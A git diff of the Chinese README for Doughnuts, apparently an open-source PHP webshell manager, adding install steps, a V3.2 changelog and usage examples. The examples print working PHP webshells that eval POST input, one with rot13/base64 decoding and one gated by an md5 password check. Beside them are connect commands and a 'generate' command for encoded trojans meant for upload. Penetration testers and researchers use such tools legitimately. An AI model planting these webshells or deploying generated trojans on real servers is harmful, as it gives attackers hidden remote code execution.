@@ -10,6 +10,12 @@
 
 ![4](https://i.loli.net/2020/06/30/TpARQcw358XJx1I.png)
 
+## 使用文档
+
+***终于迎来了新的使用文档！***
+
+详细使用文档请前往[此页面](http://doughnuts.cc/)进行查看。
+
 ## 特征
 
 - 支持连接,记录,管理webshell,方便下一次连接
@@ -50,13 +56,22 @@
 
 ## 安装/运行方法
 
+***请在3.2版本之前运行过`python3 -m doughnuts.install`安装的朋友在更新3.2版本之后重新执行此命令!***
+
 - 使用pip安装
 
 ```sh
+# 安装
 python3 -m pip install doughnuts -i https://pypi.org/simple/
-python3 -m doughnuts # 应该对所有系统生效
-python3 -m doughnuts.install && doughnuts # (仅*unix)添加一个可调用的sh文件到/usr/local/bin中,以方便调用
-enjoy it!
+# 应该对所有系统生效
+python3 -m doughnuts
+# (windows)添加一个bat文件到python根目录下
+# (*unix)添加一个可执行文件到/usr/local/bin下
+# 以方便调用
+python3 -m doughnuts.install
+# 运行
+doughnuts
+# enjoy it!
 ```
 
 - 通过poetry安装
@@ -65,65 +80,123 @@ enjoy it!
 pyton3 -m pip install poetry # 或其他方法安装python-poetry
 git clone https://github.com/WAY29/Doughnuts.git
 cd Doughnuts
-apt-get install python3-venv # debian/ubuntu系统需要运行此命令
+# debian/ubuntu系统需要运行此命令
+apt-get install python3-venv
+# 安装
 poetry install
+# 运行
 poetry run python3 Doughnuts/doughnuts.py # 应该对所有系统生效
-enjoy it!
+# enjoy it!
 ```
-
-
 
 - 直接安装
 
 ```sh
-安装PYTHON 3.6+
+# 安装PYTHON 3.6+
 git clone https://github.com/WAY29/Doughnuts.git
 cd Doughnuts/doughnuts
 pip3 install -r requirements.txt 或 pip3 install requests colorma prettytable
-python3 doughnuts.py # 应该对所有系统生效
-python3 install.py && doughnuts # (仅*unix)添加一个可调用的sh文件到/usr/local/bin中,以方便调用
-enjoy it!
+# 应该对所有系统生效
+python3 doughnuts.py
+# (windows)添加一个bat文件到python根目录下
+# (*unix)添加一个可执行文件到/usr/local/bin下
+# 以方便调用
+python3 install.py
+# 运行
+doughnuts
+# enjoy it!
 ```
 
 ## 使用例子
 
-假如要连接以下的webshell:
+*由于windows原因，在windows命令行连接下不支持&符号连接参数。
+尽量将额外参数包裹引号进行传递，且逐一拆分。
+好的习惯:"data:a=123" "data:b=456"
+坏的习惯:"data:a=123&b=456" (在windows命令行下会连接失败)*
 
-```php
-<?php
-error_reporting(0);
-eval($_POST['2333']);
-?>
-```
+1. 普通webshell:
 
-那么只需要运行Doughnuts.py,并输入以下命令:
+    - 最平凡的webshell:
 
-```
-connect http://localhost/test.php POST 2333
-```
+        ```php
+        //test1.php
+        <?php
+        error_reporting(0);
+        eval($_POST['2333']);
+        ?>
+      ```
+      那么只需要运行Doughnuts.py,并输入以下命令,即可成功连接至webshell:
+      ```
+      connect http://localhost/test1.php POST 2333
+      ```
+      
+    - 带解码的webshell:
 
-假如要连接以下的webshell:
+        ```php
+        //test2.php
+        <?php
+        error_reporting(0);
+        eval(str_rot13(base64_decode($_REQUEST['2333'])));
+        ?>
+      ```
+    那么只需要运行Doughnuts.py,并输入以下命令,即可成功连接至webshell:
+      
+      ```
+      connect http://localhost/test2.php POST 2333 rot13 base64
+      ```
+      
+    - 需要额外参数与解码的webshell:
 
-```php
-<?php
-error_reporting(0);
-eval(str_rot13(base64_decode($_REQUEST['2333'])));
-?>
-```
+        ```php
+        //test3.php
+        <?php
+        if(@md5($_POST['a']) == "202cb962ac59075b964b07152d234b70"){  // a=123
+        	@eval(base64_decode($_POST['2333']));
+        }
+        ```
 
-那么只需要运行Doughnuts.py,并输入以下命令:
+        那么只需要运行Doughnuts.py,并输入以下命令,即可成功连接至webshell:
 
-```
-connect http://localhost/test.php POST 2333 rot13 base64
-```
+        ```
+        connect http://localhost/test.php POST 2333 base64 "data:a=123"
+        ```
 
-即可成功连接至webshell
+2. 生成webshell:
+
+    1. 在执行`python3 -m doughnuts.install`之后执行`doughnuts generate a.php POST pass salt 1`在当前目录下生成Pudding类型的webshell:a.php
+    2. 上传a.php,根据提示执行 `doughnuts connect {木马url} POST pass doughnuts-salt `连接至webshell
+
+
+
 
 ## 参考
 
-灵感源自https://github.com/WangYihang/Webshell-Sniper
+- https://github.com/WangYihang/Webshell-Sniper
+- https://github.com/epinna/weevely3
 
 ## 更新日志
+
+
+### V3.2
+- 新增命令
+    - lsh|!命令(通用) 在当前机器中运行命令,可用于切换工作目录
+    - debug命令(通用但不在帮助菜单中显示) debug SEND/LOOP 开启/关闭SEND/LOOP的调试()调试专用
+    - **generate|gen命令 (初始界面) 生成php木马,使用自制的编码方式进行编码**
+        - generate的调用方式:
+        - 直接在交互式界面外调用:
+            - 在执行`python3 -m doughnuts.install`后:`doughnuts generate a.php POST 123 1`
+            - `python3 doughnuts.py generate a.php POST 123`
+        - 在交互式界面调用:
+            - `doughnutsgenerate a.php POST 123`
+- 修改命令
+    - search命令 现在search命令的调用方式为: `search {pattern} {web_file_path}`,支持正则表达式
+    - c|connect 命令 (初始界面) 现在支持额外参数,并且可以在交互式界面外调用,如:
+        - 在执行`python3 -m doughnuts.install`后:`doughnuts connect http://127.0.0.1/eval.php POST asd data:a=123` 
+    - ls|dir 命令 现在支持模式选择：scandir(1)/glob(2)
+    - write、edit、execute支持调用自定义的编辑器
+- 修改项目结构
+- 修改文本错误
+- 修复bug
 
 
 ### V3.1
